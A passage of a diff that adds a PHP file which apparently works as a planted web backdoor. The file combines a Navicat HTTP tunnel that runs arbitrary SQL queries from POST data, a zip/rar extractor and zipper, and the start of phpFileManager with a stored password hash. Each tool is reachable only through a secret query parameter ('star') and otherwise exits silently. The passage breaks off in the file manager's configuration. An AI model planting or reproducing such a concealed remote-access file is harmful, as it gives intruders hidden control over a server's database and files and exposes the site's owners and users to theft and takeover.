@@ -1,0 +1,1648 @@
+<?php
+//{"lang":"","fm_root":".\/..\/","timezone":"","date_format":"Y\/m\/d H:i","auth_pass":"8ff953dd97c4405234a04291dee39e0b","error_reporting":1}
+
+if (isset($_GET['m'])) {
+	if($_GET['m']!='star')exit;
+	//set allowTestMenu to false to disable System/Server test page
+	$allowTestMenu = true;
+
+	$use_mysqli = function_exists("mysqli_connect");
+
+	header("Content-Type: text/plain; charset=x-user-defined");
+	error_reporting(0);
+	set_time_limit(0);
+
+	function phpversion_int()
+	{
+		list($maVer, $miVer, $edVer) = preg_split("(/|\.|-)", phpversion());
+		return $maVer * 10000 + $miVer * 100 + $edVer;
+	}
+
+	if (phpversion_int() < 50300) {
+		set_magic_quotes_runtime(0);
+	}
+
+	function GetLongBinary($num)
+	{
+		return pack("N", $num);
+	}
+
+	function GetShortBinary($num)
+	{
+		return pack("n", $num);
+	}
+
+	function GetDummy($count)
+	{
+		$str = "";
+		for ($i = 0; $i < $count; $i++)
+			$str .= "\x00";
+		return $str;
+	}
+
+	function GetBlock($val)
+	{
+		$len = strlen($val);
+		if ($len < 254)
+			return chr($len) . $val;
+		else
+			return "\xFE" . GetLongBinary($len) . $val;
+	}
+
+	function EchoHeader($errno)
+	{
+		$str = GetLongBinary(1111);
+		$str .= GetShortBinary(202);
+		$str .= GetLongBinary($errno);
+		$str .= GetDummy(6);
+		echo $str;
+	}
+
+	function EchoConnInfo($conn)
+	{
+		if ($GLOBALS['use_mysqli']) {
+			$str = GetBlock(mysqli_get_host_info($conn));
+			$str .= GetBlock(mysqli_get_proto_info($conn));
+			$str .= GetBlock(mysqli_get_server_info($conn));
+			echo $str;
+		} else {
+			$str = GetBlock(mysql_get_host_info($conn));
+			$str .= GetBlock(mysql_get_proto_info($conn));
+			$str .= GetBlock(mysql_get_server_info($conn));
+			echo $str;
+		}
+	}
+
+	function EchoResultSetHeader($errno, $affectrows, $insertid, $numfields, $numrows)
+	{
+		$str = GetLongBinary($errno);
+		$str .= GetLongBinary($affectrows);
+		$str .= GetLongBinary($insertid);
+		$str .= GetLongBinary($numfields);
+		$str .= GetLongBinary($numrows);
+		$str .= GetDummy(12);
+		echo $str;
+	}
+
+	function EchoFieldsHeader($res, $numfields)
+	{
+		$str = "";
+		for ($i = 0; $i < $numfields; $i++) {
+			if ($GLOBALS['use_mysqli']) {
+				$finfo = mysqli_fetch_field_direct($res, $i);
+				$str .= GetBlock($finfo->name);
+				$str .= GetBlock($finfo->table);
+
+				$type = $finfo->type;
+				$length = $finfo->length;
+
+				$str .= GetLongBinary($type);
+
+				$intflag = $finfo->flags;
+				$str .= GetLongBinary($intflag);
+
+				$str .= GetLongBinary($length);
+			} else {
+				$str .= GetBlock(mysql_field_name($res, $i));
+				$str .= GetBlock(mysql_field_table($res, $i));
+
+				$type = mysql_field_type($res, $i);
+				$length = mysql_field_len($res, $i);
+				switch ($type) {
+					case "int":
+						if ($length > 11) $type = 8;
+						else $type = 3;
+						break;
+					case "real":
+						if ($length == 12) $type = 4;
+						elseif ($length == 22) $type = 5;
+						else $type = 0;
+						break;
+					case "null":
+						$type = 6;
+						break;
+					case "timestamp":
+						$type = 7;
+						break;
+					case "date":
+						$type = 10;
+						break;
+					case "time":
+						$type = 11;
+						break;
+					case "datetime":
+						$type = 12;
+						break;
+					case "year":
+						$type = 13;
+						break;
+					case "blob":
+						if ($length > 16777215) $type = 251;
+						elseif ($length > 65535) $type = 250;
+						elseif ($length > 255) $type = 252;
+						else $type = 249;
+						break;
+					default:
+						$type = 253;
+				}
+				$str .= GetLongBinary($type);
+
+				$flags = explode(" ", mysql_field_flags($res, $i));
+				$intflag = 0;
+				if (in_array("not_null", $flags)) $intflag += 1;
+				if (in_array("primary_key", $flags)) $intflag += 2;
+				if (in_array("unique_key", $flags)) $intflag += 4;
+				if (in_array("multiple_key", $flags)) $intflag += 8;
+				if (in_array("blob", $flags)) $intflag += 16;
+				if (in_array("unsigned", $flags)) $intflag += 32;
+				if (in_array("zerofill", $flags)) $intflag += 64;
+				if (in_array("binary", $flags)) $intflag += 128;
+				if (in_array("enum", $flags)) $intflag += 256;
+				if (in_array("auto_increment", $flags)) $intflag += 512;
+				if (in_array("timestamp", $flags)) $intflag += 1024;
+				if (in_array("set", $flags)) $intflag += 2048;
+				$str .= GetLongBinary($intflag);
+
+				$str .= GetLongBinary($length);
+			}
+		}
+		echo $str;
+	}
+
+	function EchoData($res, $numfields, $numrows)
+	{
+		for ($i = 0; $i < $numrows; $i++) {
+			$str = "";
+			$row = null;
+			if ($GLOBALS['use_mysqli'])
+				$row = mysqli_fetch_row($res);
+			else
+				$row = mysql_fetch_row($res);
+			for ($j = 0; $j < $numfields; $j++) {
+				if (is_null($row[$j]))
+					$str .= "\xFF";
+				else
+					$str .= GetBlock($row[$j]);
+			}
+			echo $str;
+		}
+	}
+
+
+	function doSystemTest()
+	{
+		function output($description, $succ, $resStr)
+		{
+			echo "<tr><td class=\"TestDesc\">$description</td><td ";
+			echo ($succ) ? "class=\"TestSucc\">$resStr[0]</td></tr>" : "class=\"TestFail\">$resStr[1]</td></tr>";
+		}
+		output("PHP version >= 4.0.5", phpversion_int() >= 40005, array("Yes", "No"));
+		output("mysql_connect() available", function_exists("mysql_connect"), array("Yes", "No"));
+		output("mysqli_connect() available", function_exists("mysqli_connect"), array("Yes", "No"));
+		if (phpversion_int() >= 40302 && substr($_SERVER["SERVER_SOFTWARE"], 0, 6) == "Apache" && function_exists("apache_get_modules")) {
+			if (in_array("mod_security2", apache_get_modules()))
+				output("Mod Security 2 installed", false, array("No", "Yes"));
+		}
+	}
+
+	/////////////////////////////////////////////////////////////////////////////
+	////
+
+	if (phpversion_int() < 40005) {
+		EchoHeader(201);
+		echo GetBlock("unsupported php version");
+		exit();
+	}
+
+	if (phpversion_int() < 40010) {
+		global $HTTP_POST_VARS;
+		$_POST = &$HTTP_POST_VARS;
+	}
+
+	if (!isset($_POST["actn"]) || !isset($_POST["host"]) || !isset($_POST["port"]) || !isset($_POST["login"])) {
+		$testMenu = $allowTestMenu;
+		if (!$testMenu) {
+			EchoHeader(202);
+			echo GetBlock("invalid parameters");
+			exit();
+		}
+	}
+
+	if (!$testMenu) {
+		if ($_POST["encodeBase64"] == '1') {
+			for ($i = 0; $i < count($_POST["q"]); $i++)
+				$_POST["q"][$i] = base64_decode($_POST["q"][$i]);
+		}
+
+		if (!function_exists("mysql_connect") && !function_exists("mysqli_connect")) {
+			EchoHeader(203);
+			echo GetBlock("MySQL not supported on the server");
+			exit();
+		}
+
+		$errno_c = 0;
+		$hs = $_POST["host"];
+		if ($use_mysqli) {
+			if ($_POST["port"])
+				$conn = mysqli_connect($hs, $_POST["login"], $_POST["password"], '', $_POST["port"]);
+			else
+				$conn = mysqli_connect($hs, $_POST["login"], $_POST["password"]);
+			$errno_c = mysqli_connect_errno($conn);
+			if (phpversion_int() >= 50005) {  // for unicode database name
+				mysqli_set_charset($conn, 'UTF8');
+			}
+			if ($errno_c > 0) {
+				EchoHeader($errno_c);
+				echo GetBlock(mysqli_connect_error($conn));
+				exit;
+			}
+
+			if (($errno_c <= 0) && ($_POST["db"] != "")) {
+				$res = mysqli_select_db($conn, $_POST["db"]);
+				$errno_c = mysqli_errno($conn);
+			}
+
+			EchoHeader($errno_c);
+			if ($errno_c > 0) {
+				echo GetBlock(mysqli_error($conn));
+			} elseif ($_POST["actn"] == "C") {
+				EchoConnInfo($conn);
+			} elseif ($_POST["actn"] == "Q") {
+				for ($i = 0; $i < count($_POST["q"]); $i++) {
+					$query = $_POST["q"][$i];
+					if ($query == "") continue;
+					if (phpversion_int() < 50400) {
+						if (get_magic_quotes_gpc())
+							$query = stripslashes($query);
+					}
+					$res = mysqli_query($conn, $query);
+					$errno = mysqli_errno($conn);
+					$affectedrows = mysqli_affected_rows($conn);
+					$insertid = mysqli_insert_id($conn);
+					if (false !== $res) {
+						$numfields = mysqli_field_count($conn);
+						$numrows = mysqli_num_rows($res);
+					} else {
+						$numfields = 0;
+						$numrows = 0;
+					}
+					EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
+					if ($errno > 0)
+						echo GetBlock(mysqli_error($conn));
+					else {
+						if ($numfields > 0) {
+							EchoFieldsHeader($res, $numfields);
+							EchoData($res, $numfields, $numrows);
+						} else {
+							if (phpversion_int() >= 40300)
+								echo GetBlock(mysqli_info($conn));
+							else
+								echo GetBlock("");
+						}
+					}
+					if ($i < (count($_POST["q"]) - 1))
+						echo "\x01";
+					else
+						echo "\x00";
+					if (false !== $res)
+						mysqli_free_result($res);
+				}
+			}
+		} else {
+			if ($_POST["port"]) $hs .= ":" . $_POST["port"];
+			$conn = mysql_connect($hs, $_POST["login"], $_POST["password"]);
+			$errno_c = mysql_errno();
+			if (phpversion_int() >= 50203) {  // for unicode database name
+				mysql_set_charset('UTF8', $conn);
+			}
+			if (($errno_c <= 0) && ($_POST["db"] != "")) {
+				$res = mysql_select_db($_POST["db"], $conn);
+				$errno_c = mysql_errno();
+			}
+
+			EchoHeader($errno_c);
+			if ($errno_c > 0) {
+				echo GetBlock(mysql_error());
+			} elseif ($_POST["actn"] == "C") {
+				EchoConnInfo($conn);
+			} elseif ($_POST["actn"] == "Q") {
+				for ($i = 0; $i < count($_POST["q"]); $i++) {
+					$query = $_POST["q"][$i];
+					if ($query == "") continue;
+					if (phpversion_int() < 50400) {
+						if (get_magic_quotes_gpc())
+							$query = stripslashes($query);
+					}
+					$res = mysql_query($query, $conn);
+					$errno = mysql_errno();
+					$affectedrows = mysql_affected_rows($conn);
+					$insertid = mysql_insert_id($conn);
+					$numfields = mysql_num_fields($res);
+					$numrows = mysql_num_rows($res);
+					EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
+					if ($errno > 0)
+						echo GetBlock(mysql_error());
+					else {
+						if ($numfields > 0) {
+							EchoFieldsHeader($res, $numfields);
+							EchoData($res, $numfields, $numrows);
+						} else {
+							if (phpversion_int() >= 40300)
+								echo GetBlock(mysql_info($conn));
+							else
+								echo GetBlock("");
+						}
+					}
+					if ($i < (count($_POST["q"]) - 1))
+						echo "\x01";
+					else
+						echo "\x00";
+					mysql_free_result($res);
+				}
+			}
+		}
+		exit();
+	}
+
+	header("Content-Type: text/html");
+	////
+	/////////////////////////////////////////////////////////////////////////////
+	?>
+
+		<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+		<html>
+
+		<head>
+			<title>Navicat HTTP Tunnel Tester</title>
+			<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+			<style type="text/css">
+				body {
+					margin: 30px;
+					font-family: Tahoma;
+					font-weight: normal;
+					font-size: 14px;
+					color: #222222;
+				}
+
+				table {
+					width: 100%;
+					border: 0px;
+				}
+
+				input {
+					font-family: Tahoma, sans-serif;
+					border-style: solid;
+					border-color: #666666;
+					border-width: 1px;
+				}
+
+				fieldset {
+					border-style: solid;
+					border-color: #666666;
+					border-width: 1px;
+				}
+
+				.Title1 {
+					font-size: 30px;
+					color: #003366;
+				}
+
+				.Title2 {
+					font-size: 10px;
+					color: #999966;
+				}
+
+				.TestDesc {
+					width: 70%
+				}
+
+				.TestSucc {
+					color: #00BB00;
+				}
+
+				.TestFail {
+					color: #DD0000;
+				}
+
+				.mysql {}
+
+				.pgsql {
+					display: none;
+				}
+
+				.sqlite {
+					display: none;
+				}
+
+				#page {
+					max-width: 42em;
+					min-width: 36em;
+					border-width: 0px;
+					margin: auto auto;
+				}
+
+				#host,
+				#dbfile {
+					width: 300px;
+				}
+
+				#port {
+					width: 75px;
+				}
+
+				#login,
+				#password,
+				#db {
+					width: 150px;
+				}
+
+				#Copyright {
+					text-align: right;
+					font-size: 10px;
+					color: #888888;
+				}
+			</style>
+			<script type="text/javascript">
+				function getInternetExplorerVersion() {
+					var ver = -1;
+					if (navigator.appName == "Microsoft Internet Explorer") {
+						var regex = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
+						if (regex.exec(navigator.userAgent))
+							ver = parseFloat(RegExp.$1);
+					}
+					return ver;
+				}
+
+				function setText(element, text, succ) {
+					element.className = (succ) ? "TestSucc" : "TestFail";
+					element.innerHTML = text;
+				}
+
+				function getByteAt(str, offset) {
+					return str.charCodeAt(offset) & 0xff;
+				}
+
+				function getIntAt(binStr, offset) {
+					return (getByteAt(binStr, offset) << 24) +
+						(getByteAt(binStr, offset + 1) << 16) +
+						(getByteAt(binStr, offset + 2) << 8) +
+						(getByteAt(binStr, offset + 3) >>> 0);
+				}
+
+				function getBlockStr(binStr, offset) {
+					if (getByteAt(binStr, offset) < 254)
+						return binStr.substring(offset + 1, offset + 1 + binStr.charCodeAt(offset));
+					else
+						return binStr.substring(offset + 5, offset + 5 + getIntAt(binStr, offset + 1));
+				}
+
+				function doServerTest() {
+					var version = getInternetExplorerVersion();
+					if (version == -1 || version >= 9.0) {
+						var xmlhttp = (window.XMLHttpRequest) ? new XMLHttpRequest() : xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+
+						xmlhttp.onreadystatechange = function() {
+							var outputDiv = document.getElementById("ServerTest");
+							if (xmlhttp.readyState == 4) {
+								if (xmlhttp.status == 200) {
+									var errno = getIntAt(xmlhttp.responseText, 6);
+									if (errno == 0)
+										setText(outputDiv, "Connection Success!", true);
+									else
+										setText(outputDiv, parseInt(errno) + " - " + getBlockStr(xmlhttp.responseText, 16), false);
+								} else
+									setText(outputDiv, "HTTP Error - " + xmlhttp.status, false);
+							}
+						}
+
+						var params = "";
+						var form = document.getElementById("TestServerForm");
+						for (var i = 0; i < form.elements.length; i++) {
+							if (i > 0) params += "&";
+							params += form.elements[i].id + "=" + form.elements[i].value.replace("&", "%26");
+						}
+
+						document.getElementById("ServerTest").className = "";
+						document.getElementById("ServerTest").innerHTML = "Connecting...";
+						xmlhttp.open("POST", "", true);
+						xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+						xmlhttp.setRequestHeader("Content-length", params.length);
+						xmlhttp.setRequestHeader("Connection", "close");
+						xmlhttp.send(params);
+					} else {
+						document.getElementById("ServerTest").className = "";
+						document.getElementById("ServerTest").innerHTML = "Internet Explorer " + version + " is not supported, please use Internet explorer 9.0 or above, firefox, chrome or safari";
+					}
+				}
+			</script>
+		</head>
+
+		<body>
+			<div id="page">
+				<p>
+					<font class="Title1">Navicat&trade;</font><br>
+					<font class="Title2">The gateway to your database!</font>
+				</p>
+				<fieldset>
+					<legend>System Environment Test</legend>
+					<table>
+						<tr style="<?php echo "display:none"; ?>">
+							<td width=70%>PHP installed properly</td>
+							<td class="TestFail">No</td>
+						</tr>
+						<?php echo doSystemTest(); ?>
+					</table>
+				</fieldset>
+				<br>
+				<fieldset>
+					<legend>Server Test</legend>
+					<form id="TestServerForm" action="#" onSubmit="return false;">
+						<input type=hidden id="actn" value="C">
+						<table>
+							<tr class="mysql">
+								<td width="35%">Hostname/IP Address:</td>
+								<td><input type=text id="host" placeholder="localhost"></td>
+							</tr>
+							<tr class="mysql">
+								<td>Port:</td>
+								<td><input type=text id="port" placeholder="3306"></td>
+							</tr>
+							<tr class="pgsql">
+								<td>Initial Database:</td>
+								<td><input type=text id="db" placeholder="template1"></td>
+							</tr>
+							<tr class="mysql">
+								<td>Username:</td>
+								<td><input type=text id="login" placeholder="root"></td>
+							</tr>
+							<tr class="mysql">
+								<td>Password:</td>
+								<td><input type=password id="password" placeholder=""></td>
+							</tr>
+							<tr class="sqlite">
+								<td>Database File:</td>
+								<td><input type=text id="dbfile" placeholder="sqlite.db"></td>
+							</tr>
+							<tr>
+								<td></td>
+								<td><br><input id="TestButton" type="submit" value="Test Connection" onClick="doServerTest()"></td>
+							</tr>
+						</table>
+					</form>
+					<div id="ServerTest"><br></div>
+				</fieldset>
+				<p id="Copyright">Copyright &copy; PremiumSoft &trade; CyberTech Ltd. All Rights Reserved.</p>
+			</div>
+		</tr>
+
+		</html>
+	<?php
+	exit;	
+}elseif(isset($_GET['z'])){
+	if($_GET['z']!='star')exit;
+	
+/**
+ * The Unzipper extracts .zip or .rar archives and .gz files on webservers.
+ * It's handy if you do not have shell access. E.g. if you want to upload a lot
+ * of files (php framework or image collection) as an archive to save time.
+ * As of version 0.1.0 it also supports creating archives.
+ *
+ * @author  Andreas Tasch, at[tec], attec.at
+ * @license GNU GPL v3
+ * @package attec.toolbox
+ * @version 0.1.1
+ */
+define('VERSION', '0.1.1');
+
+$timestart = microtime(TRUE);
+$GLOBALS['status'] = array();
+
+/**
+ * Class Unzipper
+ */
+class Unzipper {
+	public $localdir = '.';
+	public $zipfiles = array();
+  
+	public function __construct() {
+	  // Read directory and pick .zip, .rar and .gz files.
+	  if ($dh = opendir($this->localdir)) {
+		while (($file = readdir($dh)) !== FALSE) {
+		  if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
+			|| pathinfo($file, PATHINFO_EXTENSION) === 'gz'
+			|| pathinfo($file, PATHINFO_EXTENSION) === 'rar'
+		  ) {
+			$this->zipfiles[] = $file;
+		  }
+		}
+		closedir($dh);
+  
+		if (!empty($this->zipfiles)) {
+		  $GLOBALS['status'] = array('info' => '.zip or .gz or .rar files found, ready for extraction');
+		}
+		else {
+		  $GLOBALS['status'] = array('info' => 'No .zip or .gz or rar files found. So only zipping functionality available.');
+		}
+	  }
+	}
+  
+	/**
+	 * Prepare and check zipfile for extraction.
+	 *
+	 * @param string $archive
+	 *   The archive name including file extension. E.g. my_archive.zip.
+	 * @param string $destination
+	 *   The relative destination path where to extract files.
+	 */
+	public function prepareExtraction($archive, $destination = '') {
+	  // Determine paths.
+	  if (empty($destination)) {
+		$extpath = $this->localdir;
+	  }
+	  else {
+		$extpath = $this->localdir . '/' . $destination;
+		// Todo: move this to extraction function.
+		if (!is_dir($extpath)) {
+		  mkdir($extpath);
+		}
+	  }
+	  // Only local existing archives are allowed to be extracted.
+	  if (in_array($archive, $this->zipfiles)) {
+		self::extract($archive, $extpath);
+	  }
+	}
+  
+	/**
+	 * Checks file extension and calls suitable extractor functions.
+	 *
+	 * @param string $archive
+	 *   The archive name including file extension. E.g. my_archive.zip.
+	 * @param string $destination
+	 *   The relative destination path where to extract files.
+	 */
+	public static function extract($archive, $destination) {
+	  $ext = pathinfo($archive, PATHINFO_EXTENSION);
+	  switch ($ext) {
+		case 'zip':
+		  self::extractZipArchive($archive, $destination);
+		  break;
+		case 'gz':
+		  self::extractGzipFile($archive, $destination);
+		  break;
+		case 'rar':
+		  self::extractRarArchive($archive, $destination);
+		  break;
+	  }
+  
+	}
+  
+	/**
+	 * Decompress/extract a zip archive using ZipArchive.
+	 *
+	 * @param $archive
+	 * @param $destination
+	 */
+	public static function extractZipArchive($archive, $destination) {
+	  // Check if webserver supports unzipping.
+	  if (!class_exists('ZipArchive')) {
+		$GLOBALS['status'] = array('error' => 'Error: Your PHP version does not support unzip functionality.');
+		return;
+	  }
+  
+	  $zip = new ZipArchive;
+  
+	  // Check if archive is readable.
+	  if ($zip->open($archive) === TRUE) {
+		// Check if destination is writable
+		if (is_writeable($destination . '/')) {
+		  $zip->extractTo($destination);
+		  $zip->close();
+		  $GLOBALS['status'] = array('success' => 'Files unzipped successfully');
+		}
+		else {
+		  $GLOBALS['status'] = array('error' => 'Error: Directory not writeable by webserver.');
+		}
+	  }
+	  else {
+		$GLOBALS['status'] = array('error' => 'Error: Cannot read .zip archive.');
+	  }
+	}
+  
+	/**
+	 * Decompress a .gz File.
+	 *
+	 * @param string $archive
+	 *   The archive name including file extension. E.g. my_archive.zip.
+	 * @param string $destination
+	 *   The relative destination path where to extract files.
+	 */
+	public static function extractGzipFile($archive, $destination) {
+	  // Check if zlib is enabled
+	  if (!function_exists('gzopen')) {
+		$GLOBALS['status'] = array('error' => 'Error: Your PHP has no zlib support enabled.');
+		return;
+	  }
+  
+	  $filename = pathinfo($archive, PATHINFO_FILENAME);
+	  $gzipped = gzopen($archive, "rb");
+	  $file = fopen($destination . '/' . $filename, "w");
+  
+	  while ($string = gzread($gzipped, 4096)) {
+		fwrite($file, $string, strlen($string));
+	  }
+	  gzclose($gzipped);
+	  fclose($file);
+  
+	  // Check if file was extracted.
+	  if (file_exists($destination . '/' . $filename)) {
+		$GLOBALS['status'] = array('success' => 'File unzipped successfully.');
+  
+		// If we had a tar.gz file, let's extract that tar file.
+		if (pathinfo($destination . '/' . $filename, PATHINFO_EXTENSION) == 'tar') {
+		  $phar = new PharData($destination . '/' . $filename);
+		  if ($phar->extractTo($destination)) {
+			$GLOBALS['status'] = array('success' => 'Extracted tar.gz archive successfully.');
+			// Delete .tar.
+			unlink($destination . '/' . $filename);
+		  }
+		}
+	  }
+	  else {
+		$GLOBALS['status'] = array('error' => 'Error unzipping file.');
+	  }
+  
+	}
+  
+	/**
+	 * Decompress/extract a Rar archive using RarArchive.
+	 *
+	 * @param string $archive
+	 *   The archive name including file extension. E.g. my_archive.zip.
+	 * @param string $destination
+	 *   The relative destination path where to extract files.
+	 */
+	public static function extractRarArchive($archive, $destination) {
+	  // Check if webserver supports unzipping.
+	  if (!class_exists('RarArchive')) {
+		$GLOBALS['status'] = array('error' => 'Error: Your PHP version does not support .rar archive functionality. <a class="info" href="http://php.net/manual/en/rar.installation.php" target="_blank">How to install RarArchive</a>');
+		return;
+	  }
+	  // Check if archive is readable.
+	  if ($rar = RarArchive::open($archive)) {
+		// Check if destination is writable
+		if (is_writeable($destination . '/')) {
+		  $entries = $rar->getEntries();
+		  foreach ($entries as $entry) {
+			$entry->extract($destination);
+		  }
+		  $rar->close();
+		  $GLOBALS['status'] = array('success' => 'Files extracted successfully.');
+		}
+		else {
+		  $GLOBALS['status'] = array('error' => 'Error: Directory not writeable by webserver.');
+		}
+	  }
+	  else {
+		$GLOBALS['status'] = array('error' => 'Error: Cannot read .rar archive.');
+	  }
+	}
+  
+  }
+  
+  /**
+   * Class Zipper
+   *
+   * Copied and slightly modified from http://at2.php.net/manual/en/class.ziparchive.php#110719
+   * @author umbalaconmeogia
+   */
+  class Zipper {
+	/**
+	 * Add files and sub-directories in a folder to zip file.
+	 *
+	 * @param string $folder
+	 *   Path to folder that should be zipped.
+	 *
+	 * @param ZipArchive $zipFile
+	 *   Zipfile where files end up.
+	 *
+	 * @param int $exclusiveLength
+	 *   Number of text to be exclusived from the file path.
+	 */
+	private static function folderToZip($folder, &$zipFile, $exclusiveLength) {
+	  $handle = opendir($folder);
+  
+	  while (FALSE !== $f = readdir($handle)) {
+		// Check for local/parent path or zipping file itself and skip.
+		if ($f != '.' && $f != '..' && $f != basename(__FILE__)) {
+		  $filePath = "$folder/$f";
+		  // Remove prefix from file path before add to zip.
+		  $localPath = substr($filePath, $exclusiveLength);
+  
+		  if (is_file($filePath)) {
+			$zipFile->addFile($filePath, $localPath);
+		  }
+		  elseif (is_dir($filePath)) {
+			// Add sub-directory.
+			$zipFile->addEmptyDir($localPath);
+			self::folderToZip($filePath, $zipFile, $exclusiveLength);
+		  }
+		}
+	  }
+	  closedir($handle);
+	}
+  
+	/**
+	 * Zip a folder (including itself).
+	 *
+	 * Usage:
+	 *   Zipper::zipDir('path/to/sourceDir', 'path/to/out.zip');
+	 *
+	 * @param string $sourcePath
+	 *   Relative path of directory to be zipped.
+	 *
+	 * @param string $outZipPath
+	 *   Relative path of the resulting output zip file.
+	 */
+	public static function zipDir($sourcePath, $outZipPath) {
+	  $pathInfo = pathinfo($sourcePath);
+	  $parentPath = $pathInfo['dirname'];
+	  $dirName = $pathInfo['basename'];
+  
+	  $z = new ZipArchive();
+	  $z->open($outZipPath, ZipArchive::CREATE);
+	  $z->addEmptyDir($dirName);
+	  if ($sourcePath == $dirName) {
+		self::folderToZip($sourcePath, $z, 0);
+	  }
+	  else {
+		self::folderToZip($sourcePath, $z, strlen("$parentPath/"));
+	  }
+	  $z->close();
+  
+	  $GLOBALS['status'] = array('success' => 'Successfully created archive ' . $outZipPath);
+	}
+  }
+  
+$unzipper = new Unzipper;
+if (isset($_POST['dounzip'])) {
+  // Check if an archive was selected for unzipping.
+  $archive = isset($_POST['zipfile']) ? strip_tags($_POST['zipfile']) : '';
+  $destination = isset($_POST['extpath']) ? strip_tags($_POST['extpath']) : '';
+  $unzipper->prepareExtraction($archive, $destination);
+}
+
+if (isset($_POST['dozip'])) {
+  $zippath = !empty($_POST['zippath']) ? strip_tags($_POST['zippath']) : '.';
+  // Resulting zipfile e.g. zipper--2016-07-23--11-55.zip.
+  $zipfile = 'zipper-' . date("Y-m-d--H-i") . '.zip';
+  Zipper::zipDir($zippath, $zipfile);
+}
+
+$timeend = microtime(TRUE);
+$time = round($timeend - $timestart, 4);
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>File Unzipper + Zipper</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <style type="text/css">
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 150%;
+    }
+
+    label {
+      display: block;
+      margin-top: 20px;
+    }
+
+    fieldset {
+      border: 0;
+      background-color: #EEE;
+      margin: 10px 0 10px 0;
+    }
+
+    .select {
+      padding: 5px;
+      font-size: 110%;
+    }
+
+    .status {
+      margin: 0;
+      margin-bottom: 20px;
+      padding: 10px;
+      font-size: 80%;
+      background: #EEE;
+      border: 1px dotted #DDD;
+    }
+
+    .status--ERROR {
+      background-color: red;
+      color: white;
+      font-size: 120%;
+    }
+
+    .status--SUCCESS {
+      background-color: green;
+      font-weight: bold;
+      color: white;
+      font-size: 120%
+    }
+
+    .small {
+      font-size: 0.7rem;
+      font-weight: normal;
+    }
+
+    .version {
+      font-size: 80%;
+    }
+
+    .form-field {
+      border: 1px solid #AAA;
+      padding: 8px;
+      width: 280px;
+    }
+
+    .info {
+      margin-top: 0;
+      font-size: 80%;
+      color: #777;
+    }
+
+    .submit {
+      background-color: #378de5;
+      border: 0;
+      color: #ffffff;
+      font-size: 15px;
+      padding: 10px 24px;
+      margin: 20px 0 20px 0;
+      text-decoration: none;
+    }
+
+    .submit:hover {
+      background-color: #2c6db2;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+<p class="status status--<?php echo strtoupper(key($GLOBALS['status'])); ?>">
+  Status: <?php echo reset($GLOBALS['status']); ?><br/>
+  <span class="small">Processing Time: <?php echo $time; ?> seconds</span>
+</p>
+<form action="" method="POST">
+  <fieldset>
+    <h1>Archive Unzipper</h1>
+    <label for="zipfile">Select .zip or .rar archive or .gz file you want to extract:</label>
+    <select name="zipfile" size="1" class="select">
+      <?php foreach ($unzipper->zipfiles as $zip) {
+        echo "<option>$zip</option>";
+      }
+      ?>
+    </select>
+    <label for="extpath">Extraction path (optional):</label>
+    <input type="text" name="extpath" class="form-field" />
+    <p class="info">Enter extraction path without leading or trailing slashes (e.g. "mypath"). If left empty current directory will be used.</p>
+    <input type="submit" name="dounzip" class="submit" value="Unzip Archive"/>
+  </fieldset>
+
+  <fieldset>
+    <h1>Archive Zipper</h1>
+    <label for="zippath">Path that should be zipped (optional):</label>
+    <input type="text" name="zippath" class="form-field" />
+    <p class="info">Enter path to be zipped without leading or trailing slashes (e.g. "zippath"). If left empty current directory will be used.</p>
+    <input type="submit" name="dozip" class="submit" value="Zip Archive"/>
+  </fieldset>
+</form>
+<p class="version">Unzipper version: <?php echo VERSION; ?></p>
+</body>
+</html>
+
+<?php
+exit;
+}
+		//{"lang":"","fm_root":"f:\\","timezone":"","date_format":"Y\/m\/d H:i","auth_pass":"8ff953dd97c4405234a04291dee39e0b","error_reporting":1}
+		/*--------------------------------------------------
+		 | PHP FILE MANAGER
+		 +--------------------------------------------------
+		 | phpFileManager 1.7.8
+		 | By Fabricio Seger Kolling
+		 | Copyright (c) 2004-2019 Fabrício Seger Kolling
+		 | E-mail: dulldusk@gmail.com
+		 | URL: http://phpfm.sf.net
+		 | Last Changed: 2019-02-24
+		 +--------------------------------------------------
+		 | It is the AUTHOR'S REQUEST that you keep intact the above header information
+		 | and notify it only if you conceive any BUGFIXES or IMPROVEMENTS to this program.
+		 +--------------------------------------------------
+		 | LICENSE
+		 +--------------------------------------------------
+		 | Licensed under the terms of any of the following licenses at your choice:
+		 | - GNU General Public License Version 2 or later (the "GPL");
+		 | - GNU Lesser General Public License Version 2.1 or later (the "LGPL");
+		 | - Mozilla Public License Version 1.1 or later (the "MPL").
+		 | You are not required to, but if you want to explicitly declare the license
+		 | you have chosen to be bound to when using, reproducing, modifying and
+		 | distributing this software, just include a text file titled "LICENSE" in your version
+		 | of this software, indicating your license choice. In any case, your choice will not
+		 | restrict any recipient of your version of this software to use, reproduce, modify
+		 | and distribute this software under any of the above licenses.
+		 +--------------------------------------------------
+		 | CONFIGURATION AND INSTALATION NOTES
+		 +--------------------------------------------------
+		 | This program does not include any instalation or configuration
+		 | notes because it simply does not require them.
+		 | Just throw this file anywhere in your webserver and enjoy !!
+		 +--------------------------------------------------
+		*/
+		// +--------------------------------------------------
+		// | Config
+		// +--------------------------------------------------
+		$version = '1.7.8';
+		$charset = 'UTF-8';
+		$debug_mode = false;
+		$max_php_recursion = 200;
+		$resolve_ids = 0;
+		$quota_mb = 0;
+		$upload_ext_filter = array();
+		$download_ext_filter = array();
+		$cookie_cache_time = 60*60*24*30; // 30 Days
+		$fm_color = array();
+		$fm_color['Bg'] = "EEEEEE";
+		$fm_color['Text'] = "000000";
+		$fm_color['Link'] = "0A77F7";
+		$fm_color['Entry'] = "FFFFFF";
+		$fm_color['Over'] = "C0EBFD";
+		$fm_color['Mark'] = "A7D2E4";
+		// https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP
+		$services = array();
+		//$services['13:UDP'] = "DAYTIME";
+		$services['21'] = "FTP";
